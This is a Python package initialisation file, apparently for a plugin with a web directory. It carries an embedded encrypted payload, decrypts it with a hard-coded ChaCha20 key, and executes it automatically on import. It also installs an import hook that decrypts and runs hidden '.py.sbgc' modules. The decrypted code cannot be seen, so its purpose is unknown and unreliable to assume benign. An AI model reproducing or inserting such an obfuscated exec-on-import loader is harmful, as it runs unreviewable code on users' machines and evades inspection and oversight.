
import hashlib as _h
import hmac as _hm
import importlib.abc as _ia
import importlib.util as _iu
import os as _os
import struct as _struct
import sys as _s
import zlib as _z
from pathlib import Path as _P
_MAGIC = b"SBGHPUB2"
_SECRET = _h.sha256(b"SHAOBKJ_GITHUB_PUBLISH_2026_V2").digest()
_PLUGIN_DIR = _P(__file__).resolve().parent
_INIT_PAYLOAD = b'SBGHPUB2M\x81\x01\xe8\x19\x7f\x82A\x1c\xf5n\t\x84\xa15\x95\x17\xe5\xdc\xcd\xbe@\xb1\x0c\xb2\x12\xc0^\x00\xbe\xf6\xfbm\x1f\xb7\x84\x073=\x8d\xc1Z\xae\xa8p\x1f\xd3\xd6\xf3\xdd\x95v\xc0B\x9b\xbc<\xbd\x9cU\xba\xc4F\x8eo\xed\'\xfaKh3Q\xd9\xd0]\xbe\xafoh\x93X\x1d:=m\xe7\x17\xb9\x11P\xb9\xca\x1d\xb2\x13\xcb\x01\xdd\xe16\xa7Ts\xd5P\xe0\xe4\xae\xe5\xf9\xaa\xd7\x19\x8f1\xf9\x9ew\xde\xb99\x90\xeaz\xe8\xb2\x9c\xa3\xde\xfa\x00\xbd\x17\x9f"\xea..3\xbd~a\x81}\x1c\x18\xe1\x19\xb3\xea\\\x96\xd1\x88&\x0e\xd6MkM\x0f\xf3\x02e\xc7\x03*\x1c\xc6\xac\xa8-\x1f\x9a\x1c\x19\x973\x14\x1b\xdb\xea\xb4u\xa4\xac\xeas\x1c\xf3\xeb&\x97\xd7{\xf0\x08\x1c\x88zw\xcc\xb7\x97\xf4\xf8\xf9\xe8<\xa3\xf2\xb2Ly\xb8PcL@Y'
def _rotl32(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
def _quarter_round(state, a, b, c, d):
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 12)
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 7)
def _chacha_block(key, nonce, counter):
    state = list(_struct.unpack("<4I", b"expand 32-byte k") + _struct.unpack("<8I", key) + (counter,) + _struct.unpack("<3I", nonce))
    working = state[:]
    for _ in range(10):
        _quarter_round(working, 0, 4, 8, 12); _quarter_round(working, 1, 5, 9, 13); _quarter_round(working, 2, 6, 10, 14); _quarter_round(working, 3, 7, 11, 15)
        _quarter_round(working, 0, 5, 10, 15); _quarter_round(working, 1, 6, 11, 12); _quarter_round(working, 2, 7, 8, 13); _quarter_round(working, 3, 4, 9, 14)
    return _struct.pack("<16I", *[((working[i] + state[i]) & 0xFFFFFFFF) for i in range(16)])
def _crypt(data, nonce):
    out = bytearray(); counter = 1
    for offset in range(0, len(data), 64):
        block = _chacha_block(_SECRET, nonce, counter); counter += 1
        chunk = data[offset:offset + 64]
        out.extend(value ^ block[index] for index, value in enumerate(chunk))
    return bytes(out)
def _decrypt_source(data):
    if not data.startswith(_MAGIC): raise ImportError("Invalid encrypted module.")
    nonce = data[len(_MAGIC):len(_MAGIC) + 12]; tag = data[len(_MAGIC) + 12:len(_MAGIC) + 44]; payload = data[len(_MAGIC) + 44:]
    expected = _hm.new(_SECRET, nonce + payload, _h.sha256).digest()
    if not _hm.compare_digest(tag, expected): raise ImportError("Encrypted module integrity check failed.")
    return _z.decompress(_crypt(payload, nonce)).decode("utf-8-sig").lstrip("\ufeff")
class _Loader(_ia.Loader):
    def __init__(self, fullname, path, is_package=False):
        self.fullname = fullname; self.path = path; self._is_package = is_package
    def create_module(self, spec): return None
    def is_package(self, fullname): return self._is_package
    def exec_module(self, module):
        source = _decrypt_source(self.path.read_bytes())
        module.__file__ = str(self.path); module.__loader__ = self; module.__cached__ = None
        module.__package__ = self.fullname if self._is_package else self.fullname.rpartition(".")[0]
        if self._is_package: module.__path__ = [str(self.path.parent)]
        exec(compile(source, str(self.path), "exec"), module.__dict__)
class _Finder(_ia.MetaPathFinder):
    def find_spec(self, fullname, path=None, target=None):
        prefix = __name__ + "."
        if not fullname.startswith(prefix): return None
        rel_path = fullname[len(prefix):].replace(".", _os.sep); base = _PLUGIN_DIR
        module_file = base / f"{rel_path}.py.sbgc"; package_file = base / rel_path / "__init__.py.sbgc"
        if module_file.is_file(): return _iu.spec_from_loader(fullname, _Loader(fullname, module_file), origin=str(module_file))
        if package_file.is_file():
            loader = _Loader(fullname, package_file, True)
            spec = _iu.spec_from_loader(fullname, loader, origin=str(package_file), is_package=True); spec.submodule_search_locations = [str(package_file.parent)]; return spec
        package_dir = base / rel_path
        if package_dir.is_dir():
            spec = _iu.spec_from_loader(fullname, loader=None, is_package=True); spec.submodule_search_locations = [str(package_dir)]; return spec
        return None
WEB_DIRECTORY = "web"
if not any(isinstance(f, _Finder) for f in _s.meta_path): _s.meta_path.insert(0, _Finder())
exec(compile(_decrypt_source(_INIT_PAYLOAD), str(_PLUGIN_DIR / "__init__.py"), "exec"), globals())
WEB_DIRECTORY = "web"

